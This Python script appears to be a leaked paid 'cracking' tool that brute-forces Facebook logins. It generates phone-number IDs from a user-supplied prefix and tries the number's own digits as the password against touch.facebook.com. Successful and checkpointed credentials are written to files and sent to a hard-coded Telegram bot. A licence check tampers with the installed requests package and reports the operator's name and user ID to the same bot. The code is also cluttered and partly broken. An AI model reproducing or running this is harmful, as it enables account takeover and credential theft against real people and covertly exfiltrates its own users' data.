import os, requests.sessions, time, webbrowser, shutil
from datetime import datetime
currenthm = datetime.now()
#print(str(currenthm.hour)+str(':')+str(currenthm.minute))
from platform import python_version
if '2.7' in python_version():print('\033[91mYou Are Using Python2.7... \nPlease Upgrade To Python3.11');exit()
else:pass
try:os.system('pip -q install requests')
except: ImportError:os.system('pip install requests');os.system('clear')
os.system('rm -rf .rm.txt')
os.system('rm --help >> .rm.txt')
try:shutil.rmtree('.pip.txt')
except FileNotFoundError:pass
try:shutil.rmtree('.pip3.txt')
except FileNotFoundError:pass
try:shutil.rmtree('.pip3.11.txt')
except FileNotFoundError:pass
rmr=open('.rm.txt', 'r').readlines()
if '' in rmr:
	os.system('clear')
	exit('Are you edit rm file?')
elif 'Usage: rm [OPTION]... [FILE]...' in rmr:
	pass

#The program pip is not installed.
os.system('pip --help >> .pip.txt')
pip=open('.pip.txt', 'r').readlines()
if '' in pip:
	os.system('clear')
	exit('Are you edit [ pip ] file?')
elif 'pip <command> [options]' in pip:
	pass

#The program pip3 is not installed.
os.system('pip3 >> .pip3.txt')
pip3=open('.pip3.txt', 'r').readlines()
if '' in pip3:
	os.system('clear')
	exit('Are you edit [ pip3 ] file?')
elif 'pip3 <command> [options]' in pip3:
	pass

#The program pip3.11 is not installed.
os.system('pip3.11 >> .pip3.11.txt')
pip311=open('.pip3.11.txt', 'r').readlines()
if '' in pip311:
	os.system('clear')
	exit('Are you edit [ pip3.11 ] file?')
elif 'pip3.11 <command> [options]' in pip311:
	pass
def xxxid(filexid, send_bot):
	import os
	os.system('pip -q install wget')
	os.system('pip -q install requests')


	#os.system('pip show Packages')
	os.system('rm -rf .ch1.txt')
	os.system('rm -rf .ch2.txt')
	os.system('rm -rf module.txt')
	os.system('touch .module.txt')
	os.system('pip3 show requests >> .module.txt')
	try:
		rr=open('.module.txt', 'r').read()
		r1=rr.split('Location: ')[1]
		r2=r1.split('\n')[0]
	except IndexError:
	     exit('Do you want to bypass..?!')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
	os.system(f'rm -rf {r2}/requests/*')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')

	try:
		try:
			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
			os.system('pip3 -q uninstall requests -y')
			os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')

		except (IndexError, IOError, OSError, requests.errors, requests.errors_only, requests.exceptions, Exception, KeyError, EOFError, NameError, ValueError, TabError, PermissionError, TimeoutError, ExceptionGroup):
			print('Error ');exit()
	except:print('error0000');exit()
	os.system('rm -rf requests-2.29.0.tar.gz')
	os.system('wget https://files.pythonhosted.org/packages/4c/d2/70fc708727b62d55bc24e43cc85f073039023212d482553d853c44e57bdb/requests-2.29.0.tar.gz')
	os.system(f'tar -xvf requests-2.29.0.tar.gz;cp -r requests-2.29.0/requests {r2}')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests')
	os.system(f'chmod ugo+rwx {r2}/requests/*;chmod ugo+rwx {r2}/requests/*')
	os.system(f'rm -rf {r2}/requests/*')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
	os.system(f'chmod ugo+rwx {r2}/requests;chmod ugo+rwx {r2}/requests/*')
	os.system('rm -rf requests-2.29.0.tar.gz')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')
	import os,requests.sessions,time,webbrowser
	os.system('pip3 -q uninstall requests -y')
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.31.0')

	try:
		os.system('clear')
		requests.Session().get('https://t.me/i4m_tiger')
		os.system('clear')
	except Exception:
		print('Send Message For Owner >>> https://t.me/i4m_tiger')
		webbrowser.open('https://t.me/i4m_tiger')
		print('\033[91mConnection Error')
		exit()
	

	iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
	iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('tiger00`'))[::-1]
	iq22 = (str(os.geteuid()).join(str(os.getlogin())))
	os.system('pip3 -q install --force-reinstall --no-deps requests==2.29.0')
	os.system(f'ls {r2}/requests/* -all >> .ch1.txt')
	ch1=open('.ch1.txt', 'r').read()
	if (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime()  not in str(ch1):
			print('Are You Edit Files Requests? - 1');exit()
	elif (str(currenthm.hour)+str(':')+str(currenthm.minute)) in time.ctime() in str(ch1):
			pass

	if iq2 not in filexid:

		print(send_bot)
	elif iq2 in filexid:
		pass

	try:
		if iq2 in filexid:
			os.system('clear')
			print("\033[92m YOUR ID IS ACTIVE .....")
			tigerr()
			time.sleep(1)
			pass
			print('\033[90m		#succss ByPaSs ')
		else:
			os.system('clear')
			print("\033[91m YOUR ID IS NOT ACTIVE")
			time.sleep(1)
			exit()
	except (Exception,KeyError,ConnectionError,ValueError):
		print('Send Message For Owner >>> https://t.me/i4m_tiger')
		webbrowser.open('https://t.me/i4m_tiger')
		print('\033[91mConnection Error')
		exit()

def run():
	if __name__ == '__main__':
		os.system('clear')
		name=input(' Enter Your name : ')
		iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
		iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('tiger00`'))[::-1]
		iq22 = (str(os.geteuid()).join(str(os.getlogin())))
		xxxid(requests.Session().get('https://raw.githubusercontent.com/krd-tiger/COBRA/main/id.txt').text, requests.Session().post("https://api.telegram.org/bot6349986663:AAHUUhLpcE_2nsoE7eIIEHjh306oT7Dn9BM/sendMessage?chat_id=6278346102&text=NAME : "+name+"\nID : "+iq22))
		exit()
		
run()

# FUCK BY SYED-ZADA
# LKING PAID SCRIPT OPEN SOURCE 
import requests
filexid = requests.get("https://raw.githubusercontent.com/krd-tiger/COBRA/main/id.txt").text
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
def clear():
	os.system('clear')
	print(logo)
def linex():
	print('\033[1;97m--------------------------------------------------')
def write(text):
	for i in text+"\n":
		sys.stdout.write(i);sys.stdout.flush()
		time.sleep(0.01)
##------------------------Device------------##
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Etisalat Af'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=3.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')



try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Etisalat Af"
                        sim_id+=fbcr
        else:
                fbcr = 'Etisalat Af'
                sim_id+=fbcr
except:
        fbcr = "Etisalat Af"
device = {'android_version':android_version,'model':model,'build':build,'fblc':fblc,'fbmf':fbmf,'fbbd':fbbd,'fbdv':model,'fbsv':fbsv,'fbca':fbca,'fbdm':fbdm}
import random
from time import sleep
import requests,os,bs4
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
ses = requests.Session()
session = requests.Session()
try:
    print(' \033[1;91m[\033[1;92m✔ \033[1;91m]\033[1;92m Loading To Next...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system(oss)
    else:pass
except:print('\n \033[1;91m[\033[1;92m✔\033[1;91m] No internet connection ...')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2 = []
ugen = []
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
import requests,colorama,mechanize
from tokenize import cookie_re
import requests
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
if os.name=='nt':oss="cls"
else:oss="clear"

now = datetime.datetime.today()


os.system(oss)
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python num.py')
  
agents = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 6.0.1; SM-P355M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 9; VKY-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
				'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
				'Mozilla/5.0 (Linux; Android 9; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 11; LM-K525) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 10; Twist 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
				'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36'
])
id_my = '6278346102'
token_my = '6349986663:AAHUUhLpcE_2nsoE7eIIEHjh306oT7Dn9BM'
logo ="""
\033[31;1m ______   _______  _        _______  _       
\033[36;1m(  ___ \ (  ___  )( \      (  ____ \( (    /|
\033[35;1m| (   ) )| (   ) || (      | (    \/|  \  ( |
\033[34;1m| (__/ / | (___) || |      | (__    |   \ | |
\033[36;1m|  __ (  |  ___  || |      |  __)   | (\ \) |
\033[32;1m| (  \ \ | (   ) || |      | (      | | \   |
\033[33;1m| )___) )| )   ( || (____/\| (____/\| )  \  |
\033[31;1m|/ \___/ |/     \|(_______/(_______/|/    )_)

\033[31;1m[ Author ] = BALEN HACKER
\033[36;1m[ Github ] = https://github.com/tiger-krd
\033[35;1m[ TELEGRAM ] = @KRD_CRACKERS
\033[33;1m[ PAID-TOOL ]  \033[32;1m3$\033[33;1m ONE MONTH
\033[34;1m=======================================
"""

                                      
  
loop = 0
oks = []
b=0
cps = []
c=0
g=0
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def tigerr():
	os.system(oss)
	print(logo)
	print('')
	print(54*'_')
	opt = ('1')
	if opt =='1':
		random_crack()
    
def random_crack():
	os.system(oss)
	print(logo)         
	print('\033[1;31m[1]Random UID crack')
	print(54*'_')
	opt=("1")
	# opt = input('Choose  >>> ')
	if opt =='1':
		random_number()
	elif opt =='3':
		tigerr()
	else:
		print('\033[1;31mChoose valid option\033[0;97m')

def random_number():
	import webbrowser
	user=[]
	os.system(oss)
	print(logo)
	print("""\033[1;35m 964751  964750  964770  964780 """)
	print(" ")
	kode = input('\033[1;33m CODEK BNWSA = ')
	
	limit = int(('500'))
	for nmbr in range(limit):
		
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system(oss)
		print(logo)
		tl = str(len(user))
		
		print('\033[1;92m CODE : '+kode)
		print('\033[1;92m ALL NUMBERS : '+tl)
		
		print(54*'_')
		for guru in user:
			uid = kode+guru
			frs = kode
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(54*'_')
	print('CRACK KOTAY HAT [!]')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
    
def rcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	global b,c,g
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://touch.facebook.com').text
			log_data = {
			"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'touch.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://touch.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				cok=coki
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				w =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+cok}).text
				sop = bs4.BeautifulSoup(w,"html.parser")
				x = sop.find("form",method="post")
				game = [i.text for i in x.find_all("h3")]
				try:
					for i in range(len(game)):
						print ("\r%s\033[0m%s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
				except AttributeError:
						print ("\r%s\033[0m cookie invalid"%(M))
				w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+cok}).text
				sop = bs4.BeautifulSoup(w,"html.parser")
				x = sop.find("form",method="post")
				game = [i.text for i in x.find_all("h3")]
				for i in range(len(game)):
					print ("\r%s\033[0m%s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
					g+=1
					os.system('cls'if os.name=='net'else'cls')
				print(f'EMAIL : {uid}\n PASS : {ps}')
				tlg = (f'''
                𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺-OK✔️
⋘─────━TIGER━─────⋙
❖ - ID : {uid}
❖-
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}
⋘─────━TIGER━─────⋙''')
				open('tiger-ok.txt', 'a').write(uid+' | '+ps+'\n')
				send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + tlg
				responsek = requests.get(send_my)
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				c+=1
				os.system('cls'if os.name=='net'else'cls')
				print(f'\033[1;33mEMAIL : {uid}\n PASS : {ps}')
				tlg = (f'''
                𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺-CP✔️
⋘─────━TIGER━─────⋙
❖ - ID : {uid}
❖-
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}
⋘─────━TIGER━─────⋙''')
				open('tiger-cp.txt', 'a').write(uid+' | '+ps+'\n')
				send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + tlg
				responsek = requests.get(send_my)
				cps.append(cid)
				break
			else:
				continue
		sleep(1)
		loop+=1
		b+=1
		os.system(oss)
		print(logo)
		print(f'\033[92m[OK] : [{g}]\n \n\033[91m[CP] : [{c}]\n \n\033[93m[BAD] : [{b}]\n \n\033[95m[TESTED] : {uid}|{ps} ')
		time.sleep(2)
		# print('  TOTAL : {tl}\n    [^] Tested : '+str(b)+'\n    [+] Good : '+str(g)+' \n    [-] Checkpoint : '+str(c)+' \n   [BAD] : '+str(uid)+' | '+str(ps)+' ')
		print('SIM'+kode)
		
	except:
		pass
tigerr()



